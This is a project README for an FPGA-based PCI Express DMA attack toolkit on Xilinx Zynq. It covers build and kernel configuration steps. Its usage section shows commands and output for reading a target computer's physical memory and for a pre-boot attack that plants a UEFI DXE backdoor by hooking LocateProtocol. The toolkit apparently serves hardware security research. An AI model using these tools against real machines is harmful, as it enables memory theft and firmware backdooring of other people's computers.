 
# Xilinx Zynq DMA attack tools

## General Information

This design allows to send and receive raw TLP packets of PCI Express bus form the application code running on Xilinx Zynq processing system. It can be used for prototyping, studying of PCI Express transaction and application layers, performing DMA attacks and other purposes.

It's compatible with my previously released Python tools available at [PCI Express DIY hacking toolkit](https://github.com/Cr4sh/s6_pcie_microblaze) project page.

Programmable logic part of this design uses PCI Express Hard IP and two AXI DMA cores: axi_dma_0 for copying TLP streams into the RAM and axi_dma_1 to access PCI Express endpoint configuration space with `python/pcie_cfg.py` utility. To work with AXI DMA cores on processing system side Python tools are using [Linux Userspace I/O framework](https://www.kernel.org/doc/html/v4.14/driver-api/uio-howto.html), for more information see `python/linux_uio.py` and `python/linux_axi_dma.py` files.


## Building the Project

To build the project you have to perform the following steps:

 1) Run `make project` to create Vivado project from `zc_pcie_dma.tcl`.

 2) Open `zc_pcie_dma/zc_pcie_dma.xpr` in Vivado, run sythesis, implementation, generate the bitstream and export hardware design into the `zc_pcie_dma.xsa` file.

 3) Run `make bin && make uenv` to generate an example of `uEnv.txt` file used to load the bitstream with U-Boot.

 4) Run `git submodule init && git submodule update`, cd into the `devicetree/my_dtg/device-tree-xlnx` and run `git checkout xilinx-v2020.1`.

 5) Run `make dts_gen` to generate device tree source code.

 6) Open `devicetree/my_dts/pl.dtsi` and replace `compatible = "xlnx,axi-dma-7.1", "xlnx,axi-dma-1.00.a"` and `compatible = "xlnx,axi-gpio-2.0", "xlnx,xps-gpio-1.00.a"` strings with `compatible = "generic-uio"` for `axi_dma_0`, `axi_dma_1` and `axi_gpio_0` instances.

 7) Run `make dts_build` to generate device tree binary. 

 8) Copy `devicetree.dtb` and `zc_pcie_dma.bit` files to the boot partition.

For more information about building the device tree see Xilinx wiki: 

 * https://xilinx-wiki.atlassian.net/wiki/spaces/A/pages/136904764/Creating+Devicetree+from+Devicetree+Generator+for+Zynq+Ultrascale+and+Zynq+7000

 * https://xilinx-wiki.atlassian.net/wiki/spaces/A/pages/341082130/Quick+guide+to+Debugging+Device+Tree+Generator+Issues


## Configuring Linux Kernel

Python tools for performing DMA attacks are using high 32 megabytes of RAM to communicate with AXI DMA engines running on programmable logic. For this reason, you need to tell the Linux kernel to don't touch those reserved 32 megabytes of RAM by passing `mem` command line option. For example, ZC706 board has 1 gigabyte of RAM, so you need to put `mem=992M` string into your `uEnv.txt`. Reserved memory address and size is also located in the `devicetree/scratch_mem.dtsi` file used to generate device tree, if your board has different amount of RAM you have to edit `reg = <0x3e000000 0x2000000>` string before building the device tree.

Linux kernel needs to be compiled with `CONFIG_XILINX_AXIDMA` and `CONFIG_UIO` options enabled. Also, you need to pass `uio_pdrv_genirq.of_id=generic-uio` command line option to the kernel in order to get the UIO framework usable.

Example of `uEnv.txt` file with typical U-Boot configuration:

```
bootargs=console=ttyPS0,115200 root=/dev/mmcblk0p2 rw earlyprintk rootfstype=ext4 rootwait devtmpfs.mount=0 mem=992M uio_pdrv_genirq.of_id=generic-uio
load_fpga=fatload mmc 0 0x4000000 zc_pcie_dma.bit && fpga loadb 0 0x4000000 13321511
load_image=fatload mmc 0 ${kernel_load_address} ${kernel_image} && fatload mmc 0 ${devicetree_load_address} devicetree.dtb
uenvcmd=echo Copying Linux from SD to RAM... && mmcinfo && run load_fpga && run load_image && bootm ${kernel_load_address} - ${devicetree_load_address}

```


## Usage

After booting the board with needed bitstream and device tree connect its PCI Express edge connector with riser cable to the target computer and power it on.

To view PCI Express endpoint configuration space you can use `python/pcie_cfg.py` utility:

```
$ sudo ./pcie_cfg.py
[+] PCI-E link with target is up
[+] Device address is 01:00.0

           VENDOR_ID = 0x10ee
           DEVICE_ID = 0x1337
             COMMAND = 0x0
              STATUS = 0x10
            REVISION = 0x0
          CLASS_PROG = 0x0
        CLASS_DEVICE = 0x200
     CACHE_LINE_SIZE = 0x0
       LATENCY_TIMER = 0x0
         HEADER_TYPE = 0x0
                BIST = 0x0
      BASE_ADDRESS_0 = 0x91500000
      BASE_ADDRESS_1 = 0x0
      BASE_ADDRESS_2 = 0x0
      BASE_ADDRESS_3 = 0x0
      BASE_ADDRESS_4 = 0x0
      BASE_ADDRESS_5 = 0x0
         CARDBUS_CIS = 0x0
 SUBSYSTEM_VENDOR_ID = 0x10ee
        SUBSYSTEM_ID = 0x7
         ROM_ADDRESS = 0x0
      INTERRUPT_LINE = 0xff
       INTERRUPT_PIN = 0x1
             MIN_GNT = 0x0
             MAX_LAT = 0x0
```

To read target computer physical memory you can use `python/pcie_mem.py` utility:

```
$ sudo DEBUG_TLP=1 ./pcie_mem.py 0 0x20
[+] PCI-E link with target is up
[+] Device address is 01:00.0
TLP TX: size = 0x04, source = 01:00.0, type = MRd64
        tag = 0x05, bytes = 0x24, addr = 0x00000000

        0x20000009 0x010005ff 0x00000000 0x00000000

TLP RX: size = 0x0c, source = 00:00.0, type = CplD
        tag = 0x05, bytes = 36, req = 01:00.0, comp = 00:00.0

        0x4a000009 0x00000024 0x01000500
        0x00000000 0x00000000 0x00000000 0x00000000 0x00000000 0x00000000 0x00000000 0x00000000 0x00000000

00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................
00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 | ................

```

To perform pre-boot DMA attack and inject arbitrary UEFI DXE driver into the victim machine boot sequence you can use `python/uefi_backdoor_simple.py` utility with test payload as UEFI DXE driver located in `python/payloads/DmaBackdoorSimple`:

```
$ sudo ./uefi_backdoor_simple.py -p payloads/DmaBackdoorSimple/DmaBackdoorSimple_X64.efi
[+] Reading DXE phase payload from payloads/DmaBackdoorSimple/DmaBackdoorSimple_X64.efi
[+] Waiting for PCI-E link...
[!] PCI-E endpoint is not configured by root complex yet
[!] PCI-E endpoint is not configured by root complex yet
[!] PCI-E endpoint is not configured by root complex yet
[!] Bad MRd TLP completion received
[!] Bad MRd TLP completion received
[!] Bad MRd TLP completion received
[!] Bad MRd TLP completion received
[+] PCI-E link with target is up
[+] Looking for DXE driver PE image...
[+] PE image is at 0x7a440000
[+] PE image is at 0x79fc0000
[+] EFI_SYSTEM_TABLE is at 0x7a03b018
[+] EFI_BOOT_SERVICES is at 0x7a38ca30
[+] EFI_BOOT_SERVICES.LocateProtocol() address is 0x7a3957b4
Backdoor image size is 0x1520
Backdoor entry RVA is 0x5cc
Planting DXE stage driver at 0xc0000...
Hooking LocateProtocol(): 0x7a3957b4 -> 0x000c05cc
3.233141 sec.
[+] DXE driver was planted, waiting for backdoor init...
[+] DXE driver was executed
[+] DONE
```

For more information about pre-boot DMA attacks check out [PCI Express DIY hacking toolkit](https://github.com/Cr4sh/s6_pcie_microblaze) project documentation.
